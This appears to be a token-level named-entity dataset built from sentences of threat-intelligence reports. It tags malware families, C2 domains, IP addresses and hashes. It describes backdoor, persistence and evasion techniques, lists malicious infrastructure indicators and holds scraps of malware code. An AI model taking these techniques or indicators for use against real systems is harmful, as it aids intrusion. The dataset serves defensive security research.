used	O
for	O
storing	O
the	O
temp	O
files	O
)	O
Get_vAlIdIP	O
=	O
https://api.ipify.org/	O
(	O
used	O
to	O
get	O
the	O
public	O
IP	O
address	O
of	O
the	O
machine	O
)	O
FIlENAmePATHP	O
=	O
WindowsDefender.ini	O
(	O
file	O
used	O
to	O
store	O
Powershell	O
code	O
)	O
PRIVAtE	O
=	O
Private	O
Key	O
exponents	O
PUbLIc	O
=	O
Public	O
Key	O
exponents	O
Hklm	O
=	O
'	O
HKLM	O
:	O
\Software\	O
'	O
Hkcu	O
=	O
'	O
HKCU	O
:	O
\Software\	O
'	O
ValuE	O
=	O
'	O
kaspersky	O
'	O
SYSID	O
DrAGon_MidDLe	O
=	O
[	O
array	O
of	O
proxy	O
URLs	O
]	O
Among	O
those	O
variables	O
,	O
there	O
is	O
one	O
variable	O
of	O
particular	O
interest	O
,	O
DrAGon_MidDLe	O
,	O
which	O
stores	O
the	O
list	O
of	O
proxy	O
URLs	O
(	O
detailed	O
at	O
the	O
end	O
of	O
the	O
blog	O
in	O
the	O
Network	O
Indicators	O
portion	O
of	O
the	O
Indicators	O
of	O
Compromise	O
section	O
)	O
that	O
will	O
be	O
used	O
to	O
interact	O
with	O
the	O
C2	O
server	O
,	O
as	O
shown	O
in	O
Figure	O
12	O
.	O

1	O
A	O
spearphishing	O
email	O
sent	O
to	O
Alexander	O
Petrushov	O
.	O

The	O
Japanese	O
Nikkei	O

Once	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
is	O
connected	O
,	O
the	O
attacker	O
has	O
full	O
remote	O
administration	O
tool	O
(	O
RAT	O
)	O
functionality	O
via	O
the	O
controller	O
.	O

Domains	O
highlighted	O
in	O
red	O
shared	O
servers	O
with	O
Operation	B-malware.ransom
Manul	I-malware.ransom
domains	O
at	O
the	O
same	O
time	O
.	O

Victim	O
opens	O
document	O
,	O
and	O
malware	O
is	O
installed	O
by	O
exploiting	O
a	O
vulnerability	O
(	O
e.g.	O
,	O
ARM-NATO_	O
ENGLISH_30_NOV_2016.doc	O
leveraged	O
an	O
Adobe	O
Flash	O
exploit	O
,	O
CVE-2016-7855	O
,	O
to	O
install	O
GAMEFISH	O
targeted	O
machine	O
)	O
.	O

sunjavascheduler.ps1	O
syscheck.ps1	O
dns.ps1	O
activator.ps1	O
nvidia.db	O

'	O
USER-D6921F6215	O
'	O
is	O
the	O
hostname	O
of	O
the	O
victim	O
,	O
'	O
Administrator	O
'	O
is	O
the	O
victim	O
user	O
,	O
'	O
1676096002	O
'	O
is	O
the	O
current	O
Date/Time	O
in	O
decimal	O
,	O
and	O
'	O
1.0	O
'	O
is	O
a	O
version	O
number	O
also	O
stored	O
in	O
the	O
backdoor	O
.	O

Figure	O
21	O
.	O

By	O
skipping	O
over	O
the	O
XOR	O
bytes	O
and	O
Null	O
bytes	O
this	O
helps	O
the	O
malware	O
to	O
protect	O
itself	O
from	O
static	O
analysis	O
tools	O
by	O
preventing	O
an	O
accurate	O
extraction	O
.	O

Some	O
sample	O
usages	O
are	O
listed	O
below	O
.	O

510	O
@	O
@	O
1	O
?	O

185CB63BBE0EA3DF6D2A725936265160E391BC77F47FF46A3934CFB173AC	O
185CB63BA31EA7C967297252432E5A7CFC96B261EB7EF4742533CEBF37A9C081	O
185CB63BA503B9C967297252432E5A7CFC96B261EB7EF4742533CEBF37A9C081	O

The	O
CopyKittens	B-malware.backdoor
assembled	O
major	O
parts	O
of	O
their	O
attack	O
from	O
code	O
snippets	O
carefully	O
picked	O
from	O
public	O
repositories	O
and	O
online	O
forums	O
,	O
hence	O
their	O
nickname	O
.	O

Network	O
security	O
monitoring	O
,	O
indicator	O
of	O
compromise	O
(	O
IoC	O
)	O
matching	O
,	O
and	O
good	O
practice	O
guidance	O
from	O
vendors	O
and	O
other	O
stakeholders	O
represent	O
important	O
defensive	O
techniques	O
for	O
ICS	O
networks	O
.	O

interval	O
:	O
Changes	O
the	O
interval	O
in	O
which	O
the	O
backdoor	O
retrieves	O
jobs	O
;	O
the	O
default	O
interval	O
is	O
set	O
at	O
120	O
seconds	O

The	O
incident	O
mentioned	O
there	O
has	O
no	O
difference	O
with	O
other	O
cases	O
we	O
detected	O
in	O
the	O
past	O
,	O
it	O
shows	O
that	O
,	O
on	O
the	O
way	O
to	O
realize	O
national	O
informatizaion	O
,	O
we	O
must	O
fight	O
against	O
serious	O
security	O
challenges	O
as	O
we	O
confronting	O
now	O
;	O
it	O
's	O
also	O
a	O
good	O
opportunity	O
for	O
our	O
Chinese	O
people	O
and	O
enterprises	O
to	O
demonstrate	O
our	O
faith	O
and	O
the	O
efforts	O
we	O
made	O
to	O
conquer	O
the	O
challenge	O
.	O

©	O
Norman	O
AS	O
,	O
November	O
2012	O

The	O
original	O
string	O
is	O
then	O
XOR'ed	O
with	O
the	O
5-byte	O
sequence	O
.	O

This	O
means	O
it	O
will	O
always	O
end	O
up	O
in	O
the	O
same	O
branch	O
.	O

Unfortunately	O
,	O
this	O
document	O
was	O
not	O
available	O
.	O

The	O
code	O
that	O
performs	O
this	O
concatenation	O
is	O
found	O
in	O
a	O
routine	O
we	O
'll	O
call	O
FormCryptoKey_sub_49D2F4	O
(	O
)	O
:	O

MenuPass	O
is	O
a	O
well-documented	O
CN-APT	O
group	O
,	O
whose	O
roots	O
go	O
back	O
to	O
2009	O
.	O

In	O
the	O
beginning	O
of	O
April	O
2016	O
,	O
we	O
found	O
evidence	O
that	O
the	O
attacks	O
against	O
Israel	O
have	O
been	O
renewed	O
as	O
well	O
.	O

While	O
diffi	O
cult	O
to	O
conclude	O
that	O
these	O
activities	O
receive	O
any	O
form	O
of	O
state	O
sponsorship	O
or	O
direction	O
,	O
the	O
malware	O
operation	O
remains	O
a	O
funded	O
and	O
signifi	O
cant	O
risk	O
to	O
intellectual	O
property	O
in	O
the	O
enterprise	O
.	O

This	O
labelling	O
indicates	O
that	O
the	O
matching	O
sample	O
we	O
were	O
provided	O
may	O
be	O
a	O
demo	O
copy	O
a	O
FinFisher	B-malware.infosteal
product	O
per	O
the	O
domain	O
ff-demo.blogdns.org	B-url.cncsvr
.	O

[	O
그림	O
21	O
]	O
안다리엘	O
그룹과	O
다수의	O
공격	O
사이의	O
연관	O
관계	O
매크로를	O
이용한	O
공격의	O
경우에도	O
2015년과	O
2017년의	O
매크로	O
코드에	O
큰	O
차이가	O
없다	O
.	O

Subsequently	O
,	O
it	O
implements	O
the	O
Loader	O
:	O
:installLoader	O
method	O
,	O
reading	O
the	O
hardcoded	O
64-bit	O
Mach-O	O
executable	O
(	O
magic	O
value	O
0xFEEDFACF	O
)	O
,	O
and	O
writing	O
to	O
the	O
previously	O
determined	O
path	O
and	O
file	O
.	O

GMT	O
'	O
)	O
;	O
function	O
listingFile	O
(	O
$	O
fn	O
)	O
{	O
function	O
resetStorageFile	O
(	O
$	O
fn	O
)	O
{	O
if	O
(	O
!	O
file_exists	O
(	O
$	O
fn	O
)	O
)	O
return	O
false	O
;	O
echo	O
'	O
<	O
A	O
HREF=	O
\	O
'	O
$	O
fn\	O
'	O
>	O
$	O
fn	O
<	O
/A	O
>	O
<	O
BR	O
>	O
'	O
;	O
return	O
true	O
;	O
if	O
(	O
!	O
file_exists	O
(	O
$	O
fn	O
)	O
)	O
return	O
false	O
;	O
$	O
fp	O
=	O
fopen	O
(	O
$	O
fn	O
,	O
'	O
wb	O
'	O
)	O
;	O
if	O
(	O
$	O
fp	O
)	O
fclose	O
(	O
$	O
fp	O
)	O
;	O
else	O
return	O
false	O
;	O
return	O
true	O
;	O

The	O
screen	O
capture	O
utility	O
appeared	O
to	O
be	O
used	O
for	O
initial	O
information	O
gathering	O
,	O
as	O
it	O
was	O
only	O
used	O
brie y	O
at	O
the	O
beginning	O
of	O
each	O
infection	O
and	O
not	O
seen	O
again	O
.	O

forever.cowforhelp[.]com	B-url.unknown
question.shiesiido[.]com	B-url.unknown
endline.biortherm[.]com	B-url.unknown
right.marubir[.]com	B-url.unknown
baby.brabbq[.]com	B-url.unknown
lind.kruptcy[.]com	B-url.unknown
The	O
rest	O
of	O
the	O
domains	O
related	O
to	O
the	O
Cmstar	B-malware.unknown
infrastructure	O
did	O
not	O
use	O
the	O
original	O
registrant	O
noted	O
above	O
,	O
but	O
instead	O
kept	O
the	O
same	O
information	O
initially	O
used	O
to	O
register	O
them	O
.	O

After	O
writing	O
the	O
payload	O
implant	O
code	O
the	O
first	O
two	O
bytes	O
of	O
the	O
file	O
are	O
corrected	O
from	O
0x9B	O
0x8A	O
to	O
0x4D	O
0x5A	O
and	O
the	O
malware	O
is	O
entrenched	O
into	O
the	O
system	O
.	O

KG	O
72.11.148.147	B-ip.unknown
United	O
States	O
Los	O
Angeles	O
QuadraNet	O
Inc	O
23.229.3.70	B-ip.unknown
Turkey	O
Istanbul	O
Turkrdns.com	O
,	O
B2	O
Net	O
Solutions	O
Inc	O

Chi	O
tiet	O
don	O
khieu	O
nai	O
gui	O
saigontel.exe	O
,	O
which	O
translates	O
from	O
Vietnamese	O
to	O
'	O
Details	O
of	O
the	O
complaint	O
sent	O
to	O
Saigontel	O
'	O
.	O

1DEB727C05AA5FABF6224C0881970ACA78649A799EEB6864260DE976	O
35FA005A	O
94ADF4C8A27722307C11F6C0376D4A51CFD56BA3CC47F9E5447179D1E	O
0F7289F	O
A411A587B4256007F0E0A3C3A3C3097062242B5359A05A986195E76D	O
A7334B7D	O

Fortinet	O
detects	O
the	O
exploit	O
document	O
as	O
MSOffice/CVE_2017_11882.A!tr	O
and	O
the	O
Hussarini	B-malware.backdoor
samples	O
as	O
W32/Sarhust.D!tr	O
.	O

Symantec	O
protects	O
the	O
world	O
's	O
information	O
and	O
is	O
the	O
global	O
leader	O
in	O
security	O
,	O
backup	O
,	O
and	O
availability	O
solutions	O
.	O

Tags	O
:	O
MacOS	O
backdoor	O
OceanLotus	O

http://iec-co-il[.]com/iec/electricity/Pokemon-PC.zip	B-url.unknown

This	O
level	O
of	O
sophistication	O
is	O
rarely	O
seen	O
,	O
even	O
in	O
the	O
targeted	O
attacks	O
sphere	O
.	O

As	O
previously	O
detailed	O
,	O
the	O
Mabna	O
Institute	O
was	O
publicly	O
identified	O
in	O
an	O
FBI	O
indictment	O
as	O
a	O
front	O
company	O
engaged	O
in	O
hostile	O
state-sponsored	O
cyberespionage	O
on	O
behalf	O
of	O
the	O
Iranian	O
state	O
.	O

The	O
Ethiopian	O
sample	O
is	O
the	O
second	O
FinSpy	B-malware.backdoor
sample	O
we	O
have	O
discovered	O
that	O
communicates	O
with	O
a	O
server	O
we	O
identified	O
by	O
scanning	O
as	O
a	O
FinSpy	B-malware.backdoor
command	O
&	O
control	O
server	O
.	O

The	O
content	O
(	O
Here	O
omitted	O
the	O
content	O
of	O
base64	O
.	O
)	O

To	O
make	O
connections	O
less	O
suspicious	O
for	O
those	O
who	O
check	O
firewall	O
logs	O
,	O
the	O
attackers	O
registered	O
the	O
domain	O
and	O
hosted	O
it	O
on	O
that	O
IP	O
address	O
.	O

Figure	O
5	O
:	O
Benefits	O
of	O
using	O
a	O
zero-day	O
exploit	O
On	O
the	O
other	O
hand	O
,	O
there	O
are	O
some	O
negative	O
aspects	O
to	O
using	O
a	O
zero-day	O
vulnerability	O
,	O
notably	O
cost	O
of	O
operations	O
and	O
risk	O
of	O
additional	O
investigation	O
upon	O
discovery	O
.	O

76b1f75ee15273d1226392db3d8f1b2aed467c2875e11d9c14fd18120afc223a	B-hash
4edcff56f586bd69585e0c9d1d7ff4bfb1a2dac6e2a9588f155015ececbe1275	B-hash
1b5a1751960b2c08631601b07e3294e4c84dfd71896453b65a45e4396a6377cc	B-hash

Although	O
some	O
of	O
the	O
targets	O
of	O
these	O
attacks	O
overlapped	O
with	O
Beebus	O
targets	O
,	O
there	O
were	O
many	O
new	O
targets	O
discovered	O
including	O
some	O
in	O
India	O
.	O

이때	O
외부	O
업데이트	O
서버의	O
파일이	O
해킹	O
등에	O
의해	O
변조되었을	O
경우	O
,	O
악성코드가	O
포함된	O
업데	O
이트	O
파일이	O
중앙관리	O
서버를	O
통해	O
기업	O
및	O
기관에	O
배포되는	O
상황이	O
발생한다	O
.	O

In	O
2018	O
,	O
we	O
now	O
see	O
them	O
pushing	O
individual	O
and	O
separate	O
blobs	O
of	O
keylogger	O
,	O
filesystem	O
,	O
and	O
remoteshell	O
code	O
that	O
never	O
touch	O
disk	O
.	O

s.setsockopt	O
(	O
socket.SOL_SOCKET	O
,	O
socket.SO_REUSEADDR	O
,	O
1	O
)	O
25	O
.	O

When	O
processing	O
the	O
k	O
stable_var_41C	O
;	O
it	O
uses	O
another	O
accumulator	O
variable	O
,	O
implemented	O
by	O
register	O
EDI	O
,	O
to	O
choose	O
the	O
second	O
element	O
of	O
the	O
swap	O
pair	O
:	O
source	O
byte	O
,	O
the	O
first	O
element	O
of	O
the	O
swap	O
pair	O
is	O
always	O
the	O
k+1	O

The	O
later	O
registration	O
style	O
was	O
eerily	O
close	O
to	O
previously	O
registered	O
APT28	O
domains	O
,	O
however	O
,	O
the	O
malware	O
used	O
in	O
the	O
attacks	O
did	O
not	O
seem	O
to	O
line	O
up	O
at	O
all	O
.	O

TIM	O
E	O
FR	O
AM	O
E	O
AP	O
T2	O
8	O
TARG	O
ETING	O
AN	O
D	O
INTRUSION	O
AC	O
TIVIT	O
Y	O

c1ad4445f1064195de1d6756950e2ae9	B-hash
Server	O
Uranio5	O

It	O
is	O
believed	O
that	O
this	O
strain	O
has	O
been	O
active	O
from	O
2011	O
until	O
2013	O
,	O
spying	O
on	O
dedicated	O
targets	O
rather	O
than	O
being	O
spread	O
widely	O
.	O

The	O
malware	O
does	O
not	O
execute	O
immediately	O
after	O
successful	O
exploitation	O
and	O
instead	O
just	O
creates	O
a	O
Run	O
key	O
in	O
the	O
current	O
user	O
's	O
hive	O
which	O
will	O
execute	O
the	O
next	O
time	O
the	O
victim	O
user	O
accesses	O
the	O
system	O
.	O

Governments	O
,	O
journalists	O
,	O
and	O
members	O
of	O
the	O
Vietnam	O
diaspora	O
may	O
continue	O
to	O
be	O
targeted	O
.	O

two-stage	O
installation	O
.	O

Analysis	O
continues	O
and	O
any	O
relevant	O
additional	O
information	O
will	O
be	O
reported	O
as	O
soon	O
as	O
practicable	O
.	O

Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
Spyware	I-malware.infosteal
was	O
designed	O
to	O
steal	O
information	O
like	O
contacts	O
,	O
call	O
logs	O
,	O
SMS	O
,	O
and	O
photos	O
,	O
as	O
well	O
as	O
device	O
information	O
,	O
like	O
geolocation	O
-	O
in	O
order	O
to	O
keep	O
track	O
of	O
movements	O
-	O
and	O
was	O
capable	O
of	O
recording	O
surrounding	O
sounds	O
,	O
including	O
conversations	O
victims	O
had	O
while	O
their	O
phone	O
was	O
within	O
range	O
.	O

Beacon	O
added	O
command	O
runas	O
and	O
pwd	O
.	O

Initial	O
Dropper	O
Sideloaded	O
libraries	O

If	O
this	O
malware	O
were	O
to	O
be	O
copied	O
amongst	O
other	O
copies	O
of	O
an	O
administrator	O
's	O
software	O
library	O
,	O
the	O
system	O
administrator	O
may	O
later	O
confuse	O
this	O
malware	O
for	O
other	O
legitimate	O
Cisco	O
software	O
,	O
thus	O
infecting	O
him	O
and/or	O
another	O
user	O
to	O
whom	O
the	O
software	O
was	O
forwarded	O
.	O

Many	O
malware	O
families	O
and	O
tools	O
check	O
for	O
the	O
existence	O
of	O
antivirus	O
,	O
but	O
the	O
Cmstar	O
tool	O
does	O
so	O
in	O
a	O
clever	O
way	O
.	O

The	O
group	O
generates	O
what	O
are	O
likely	O
fictitious	O
personalities	O
as	O
the	O
'	O
owners	O
'	O
of	O
each	O
of	O
the	O
fake	O
domains	O
.	O

According	O
to	O
existed	O
experience	O
,	O
we	O
doubted	O
that	O
Shellcode	O
is	O
closely	O
related	O
with	O
automatic	O
attack	O
testing	O
platform	O
Cobalt	O
Strike	O
.	O

List	O
of	O
all	O
user	O
accounts	O
,	O
privilege	O
classes	O
,	O
time	O
of	O
the	O
last	O
logon	O
.	O

Coverage	O
was	O
originally	O
provided	O
in	O
the	O
UDS	O
release	O
of	O
January	O
14	O
.	O

To	O
ensure	O
that	O
the	O
DNS	O
traffic	O
would	O
not	O
be	O
filtered	O
,	O
the	O
attackers	O
configured	O
the	O
backdoor	O
to	O
communicate	O
with	O
Google	O
and	O
OpenDNS	O
DNS	O
servers	O
,	O
since	O
most	O
organizations	O
and	O
security	O
products	O
will	O
not	O
filter	O
traffic	O
to	O
those	O
two	O
major	O
DNS	O
services	O
.	O

Siemens	O
ProductCERT	O
has	O
confirmed	O
that	O
the	O
code	O
would	O
not	O
work	O
against	O
a	O
standard	O
Siemens	O
control	O
system	O
environment	O
.	O

mainThread	O
functionality	O
,	O
the	O
server	O
variant	O
is	O
giving	O
the	O
DllRegisterServer	O
time	O
to	O
activate	O
and	O
perform	O
the	O
necessary	O
operations	O
to	O
ensure	O
that	O
the	O
server	O
variant	O
is	O
properly	O
installed	O
and	O
activated	O
as	O
a	O
service	O
.	O

The	O
folders	O
&	O
bot	O
files	O
simply	O
have	O
the	O
'	O
hidden	O
'	O
attribute	O
set	O
in	O
Microsoft	O
Windows	O
.	O

The	O
main	O
process	O
of	O
the	O
attack	O
is	O
shown	O
in	O
the	O
following	O
figure	O
:	O
On	O
April	O
18	O
,	O
2018	O
,	O
Advanced	O
Threat	O
Response	O
Team	O
of	O
360	O
Core	O
Security	O
Division	O
detected	O
a	O
high-risk	O
0day	O
vulnerabilities	O
.	O

All	O
communication	O
is	O
encrypted	O
using	O
RC4	O
and	O
compressed	O
with	O
LZMA	O
.	O

JRat	B-malware.backdoor
also	O
provides	O
a	O
web	O
version	O
of	O
the	O
controller	O
,	O
which	O
is	O
open	O
source	O
.	O

The	O
backdoor	O
program	O
used	O
in	O
this	O
attack	O
is	O
actually	O
the	O
Retro	B-malware.backdoor
series	O
backdoor	O
known	O
to	O
be	O
used	O
by	O
the	O
APT-C-06	O
organization	O
.	O

Babar	B-malware.drop
also	O
enumerates	O
the	O
Windows	O
Management	O
Instrumentation	O
for	O
installed	O
AV	O
solutions	O
,	O
while	O
the	O
exact	O
use	O
of	O
this	O
information	O
is	O
not	O
yet	O
known	O
.	O

File-based	O
protection	O

ShellMainThread	O
procedure	O
,	O
and	O
terminates	O
.	O

Instead	O
of	O
spearphishing	O
emails	O
with	O
documents	O
containing	O
malicious	O
macros	O
,	O
they	O
used	O
a	O
more	O
sophisticated	O
scheme	O
known	O
as	O
a	O
supply-chain	O
attack	O
.	O

The	O
very	O
same	O
malware	O
module	O
performs	O
screen	O
captures	O
while	O
dumping	O
the	O
snooped	O
data	O
.	O

For	O
persistence	O
,	O
RedLeaves	O
will	O
add	O
a	O
shortcut	O
'	O
.lnk	O
'	O
file	O
in	O
the	O
user	O
's	O
Startup	O
folder	O
,	O
which	O
points	O
to	O
'	O
AYRUNSC.exe	O
'	O
,	O
as	O
shown	O
in	O
Exhibit	O
5	O
.	O

In	O
fact	O
,	O
in	O
2015	O
and	O
2017	O
,	O
Philippine	O
and	O
Spanish	O
universities	O
agreed	O
to	O
expand	O
scientific	O
cooperation	O
with	O
Iranian	O
institutions	O
.	O

Roarur.dll	O
Trojan	O

rastlsc.exe	O
,	O
is	O
executed	O
using	O
CreateProcessW	O
.	O

The	O
purpose	O
of	O
this	O
version	O
was	O
to	O
steal	O
information	O
on	O
the	O
compromised	O
system	O
:	O
MAC	O
Address	O
Computer	O
name	O
Username	O
IP	O
address	O
Date	O
Steal	O
files	O
with	O
the	O
following	O
extensions	O
:	O
.docx	O
,	O
.doc	O
,	O
.pptx	O
,	O
.ppt	O
,	O
.xlsx	O
,	O
.xls	O
,	O
.rtf	O
and	O
.pdf	O
The	O
volumes	O
mapped	O
on	O
the	O
system	O
All	O
this	O
information	O
was	O
then	O
sent	O
to	O
one	O
of	O
the	O
following	O
domains	O
:	O
G1	O
also	O
had	O
the	O
ability	O
to	O
execute	O
commands	O
remotely	O
on	O
the	O
infected	O
host	O
machine	O
at	O
the	O
author	O
's	O
will	O
.	O

They	O
are	O
dedicated	O
to	O
running	O
targeted	O
attacks	O
campaigns	O
to	O
aggressively	O
collect	O
information	O
from	O
company	O
networks	O
through	O
the	O
use	O
of	O
spear­phishing	O
packaged	O
with	O
embedded	O
,	O
executable	O
elements	O
inside	O
office	O
documents	O
and	O
extensive	O
lateral	O
movement	O
tools	O
.	O

Ministry	O
of	O
Foreign	O
Affairs	O
of	O
United	O
Arab	O
Emirates	O
(	O
2	O
email	O
addresses	O
at	O
mofa.gov.sa	O
)	O
.	O

Bot	O
:	O

What	O
did	O
gain	O
a	O
lot	O
of	O
media	O
attention	O
,	O
however	O
,	O
was	O
the	O
Petya-like	B-malware.ransom
outbreak	O
of	O
27	O
June	O
,	O
2017	O
,	O
because	O
it	O
successfully	O
compromised	O
a	O
lot	O
of	O
systems	O
in	O
critical	O
infrastructure	O
and	O
other	O
businesses	O
in	O
Ukraine	O
,	O
and	O
further	O
afield	O
.	O

We	O
released	O
a	O
white	O
paper	O
discussing	O
this	O
campaign	O
.	O

The	O
mrxnet.sys	O
driver	O
is	O
of	O
no	O
great	O
significance	O
to	O
our	O
story	O
,	O
as	O
it	O
is	O
a	O
separate	O
module	O
not	O
included	O
into	O
the	O
general	O
architecture	O
of	O
the	O
platform	O
.	O

There	O
are	O
automated	O
partition	O
rebuilding	O
tools	O
available	O
,	O
though	O
some	O
of	O
these	O
rely	O
on	O
a	O
valid	O
MBR	O
to	O
work	O
properly	O
(	O
In	O
this	O
case	O
that	O
would	O
n't	O
be	O
feasible	O
)	O
.	O

XtremeRAT	B-malware.backdoor
Activity	O

.net	O
)	O
.	O

The	O
backdoor	O
routine	O
exists	O
inside	O
the	O
DllMain	O
function	O
so	O
when	O
loads	O
the	O
backdoor	O
via	O
LoadLibrary	O
it	O
will	O
begin	O
spawning	O
malicious	O
threads	O
.	O

This	O
technique	O
allows	O
them	O
to	O
map	O
network	O
resources	O
and	O
make	O
lateral	O
movements	O
inside	O
the	O
network	O
,	O
landing	O
in	O
the	O
perfect	O
machine	O
to	O
match	O
the	O
attacker	O
's	O
interest	O
.	O

The	O
primary	O
intent	O
is	O
the	O
theft	O
of	O
intellectual	O
property	O
.	O

Skills	O
:	O
software	O
development	O
,	O
information	O
security	O
,	O
object-oriented	O
design	O
,	O
distributed	O
system	O
,	O
figure	O
interface	O
,	O
computer	O
network	O
design	O
,	O
blog	O
system	O
,	O
social	O
engineering	O
,	O
security	O
research	O
and	O
so	O
on	O
.	O

Additionally	O
,	O
many	O
of	O
the	O
original	O
Iranian	O
hackers	O
responsible	O
for	O
mass	O
defacements	O
hated	O
authority	O
and	O
lacked	O
the	O
discipline	O
necessary	O
for	O
government	O
work	O
.	O

Based	O
on	O
just	O
the	O
whois	O
information	O
(	O
which	O
can	O
be	O
faked	O
)	O
and	O
the	O
location	O
of	O
the	O
IP	O
address	O
it	O
is	O
hard	O
to	O
say	O
if	O
the	O
Pakistan	O
espionage	O
group	O
is	O
involved	O
in	O
this	O
attack	O
,	O
but	O
based	O
on	O
the	O
email	O
theme	O
,	O
tactics	O
used	O
to	O
impersonate	O
Indian	O
think	O
tank	O
(	O
IDSA	O
)	O
and	O
the	O
targets	O
chosen	O
that	O
possibility	O
is	O
highly	O
likely	O
.	O

However	O
,	O
using	O
the	O
malware	O
's	O
behavior	O
and	O
determining	O
the	O
command	O
file	O
's	O
format	O
via	O
reverse	O
engineering	O
afforded	O
the	O
ability	O
to	O
test	O
numerous	O
assumptions	O
about	O
the	O
malware	O
's	O
intended	O
use	O
.	O

This	O
is	O
due	O
to	O
the	O
fact	O
that	O
the	O
characters	O
were	O
written	O
in	O
Mandarin	O
in	O
the	O
original	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
3.6	O
source	O
.	O

SHA1	O
SHA256	O
ba4863d8a22864fa50a32aa85bc808371f05e8953167d34251cbd779d33e2d6d	B-hash
2df60de8cb6b9fe7db1ea10581cfcda4	B-hash
fb8057595f2bb53331620c717775751df781c151	B-hash

The	O
script	O
will	O
then	O
generate	O
and	O
execute	O
the	O
MO4TH2H0.bat	O
file	O
in	O
the	O
TEMP	O
directory	O
,	O
which	O
will	O
delete	O
the	O
NTWDBLIB.DLL	O
and	O
its	O
own	O
BAT	O
from	O
the	O
system	O
directory	O
.	O

Robot	O
TV	O
show	O
.	O

.	O

The	O
user	O
is	O
led	O
to	O
believe	O
that	O
opening	O
the	O
zip	O
file	O
,	O
which	O
is	O
descriptively	O
titled	O
as	O
being	O
the	O
Sheikh	O
's	O
opinion	O
,	O
will	O
provide	O
access	O
to	O
the	O
video	O
.	O

Over	O
the	O
past	O
several	O
years	O
,	O
many	O
browsers	O
have	O
hardened	O
their	O
attack	O
surface	O
in	O
regard	O
to	O
external	O
plugins	O
and	O
applications	O
,	O
including	O
Adobe	B-malware.drop
Flash	I-malware.drop
.	O

An	O
attack	O
against	O
a	O
poorly	O
configured	O
server	O
may	O
allow	O
an	O
adversary	O
access	O
to	O
critical	O
information	O
including	O
any	O
websites	O
or	O
databases	O
hosted	O
on	O
the	O
server	O
.	O

unsigned	O
char	O
cmd_id	O
;	O

Resolve	O
192.185.113.148	B-ip.unknown
184.172.143.188	B-ip.unknown
212.27.35.109	B-ip.unknown
206.41.94.190	B-ip.unknown
Location	O
Network	O
192.185.64.0/18	B-ip.unknown
184.172.128.0/18	B-ip.unknown
212.27.32.0/19	B-ip.unknown
206.41.94.0/24	B-ip.unknown
First	O
28.04.11	O
00:00	O
23.12.06	O
00:00	O
02.08.05	O
00:00	O
24.06.05	O
00:00	O
Last	O
10.02.15	O
00:00	O
28.04.11	O
00:00	O
23.12.06	O
00:00	O
02.08.05	O
00:00	O

The	O
malware	O
receives	O
commands	O
from	O
a	O
locally	O
stored	O
encrypted	O
file	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
location	O
of	O
the	O
hard	O
coded	O
IP	O
address	O
.	O

'	O
@	O
AnonPress	O
Greetings	O
.	O

Figure	O
9	O
:	O

ToArray	O
(	O
)	O
$	O
cs.Close	O
(	O
)	O
$	O
ms.Close	O
(	O
)	O
catch	O
{	O
}	O
function	O
decrAes	O
(	O
$	O
encData	O
,	O
$	O
key	O
,	O
$	O
iv	O
)	O
$	O
prov	O
=	O
New-Object	O
System.Security.Cryptography.RijndaelManaged	O
$	O
prov	O
.	O

This	O
section	O
contains	O
the	O
details	O
of	O
the	O
C2	O
domain	O
qhavcloud[.]com	B-url.cncsvr
.	O

In	O
an	O
appeal	O
filed	O
with	O
a	O
Swiss	O
court	O
earlier	O
this	O
year	O
,	O
members	O
of	O
Ablyazov	O
's	O
family	O
allege	O
that	O
they	O
have	O
been	O
targeted	O
by	O
a	O
campaign	O
of	O
spearphishing	O
emails	O
containing	O
family	O
,	O
attorneys	O
,	O
and	O
malware	O
going	O
back	O
to	O
2012	O
.	O

3	O
Jan	O
.	O

Based	O
on	O
the	O
base64	O
encoded	O
content	O
posted	O
in	O
the	O
Pastebin	O
,	O
userid	O
associated	O
with	O
the	O
Pastebin	O
post	O
was	O
determined	O
.	O

The	O
code	O
fragment	O
is	O
as	O
follows	O
.	O

With	O
the	O
exception	O
of	O
the	O
administrative	O
command	O
handler	O
(	O
which	O
is	O
built	O
into	O
)	O
,	O
each	O
of	O
the	O
internal	O
commands	O
consists	O
of	O
an	O
object	O
derived	O
from	O
a	O
base	O
object	O

The	O
IP	O
was	O
first	O
seen	O
to	O
be	O
active	O
on	O
18th	O
Jan	O
,	O
2017	O
(	O
one	O
week	O
before	O
the	O
spear-phishing	O
mail	O
was	O
sent	O
to	O
the	O
victims	O
)	O
.	O

HTTP	O
POST	O
traffic	O
containing	O

The	O
usage	O
of	O
the	O
compression	O
algorithms	O
in	O
Cloud	O
Altas	O
and	O
RedOctober	B-malware.unknown
is	O
another	O
interesting	O
similarity	O
.	O

They	O
continuously	O
changed	O
techniques	O
and	O
upgraded	O
their	O
arsenal	O
to	O
remain	O
under	O
the	O
radar	O
.	O

Gamma	O
has	O
repeatedly	O
denied	O
links	O
to	O
spyware	O
and	O
servers	O
uncovered	O
by	O
our	O
research	O
,	O
claiming	O
that	O
the	O
servers	O
detected	O
by	O
our	O
scans	O
are	O
'	O
not	O
...	O
from	O
the	O
FinFisher	B-malware.backdoor
product	O
line	O
.	O
'	O

Within	O
disk	O
view	O
we	O
located	O
the	O
backup	O
VBR	O
and	O
right	O
clicked	O
to	O
add	O
a	O
manual	O
partition	O
as	O
an	O
NTFS	O
file	O
system	O
.	O

Recent	O
entries	O
:	O

In	O
all	O
phishing	O
lures	O
analyzed	O
,	O
the	O
external	O
images	O
did	O
not	O
exist	O
.	O

The	O
following	O
figure	O
is	O
the	O
GET	O
request	O
comparison	O
of	O
the	O
module	O
generated	O
by	O
sample	O
module	O
3	O
and	O
Beacon	O
.	O

MDM	B-malware.infosteal
is	O
becoming	O
more	O
popular	O
throughout	O
large	O
enterprises	O
,	O
and	O
users	O
should	O
be	O
aware	O
that	O
installing	O
additional	O
certificates	O
on	O
their	O
device	O
to	O
allow	O
remote	O
management	O
can	O
result	O
in	O
potential	O
malicious	O
activity	O
.	O

Until	O
then	O
,	O
strong	O
anti-malware	O
and	O
dynamic	O
whitelisting	O
solutions	O
will	O
be	O
more	O
necessary	O
than	O
ever	O
.	O

Windows	O
screen	O
savers	O
originally	O
used	O
this	O
extension	O
but	O
nowadays	O
medium-level	O
threat	O
actors	O
commonly	O
use	O
it	O
as	O
a	O
way	O
to	O
deceive	O
the	O
average	O
user	O
who	O
might	O
be	O
deterred	O
from	O
an	O
exe	O
file	O
extension	O
.	O

and	O
July	O
1	O
,	O
2012	O
,	O
the	O
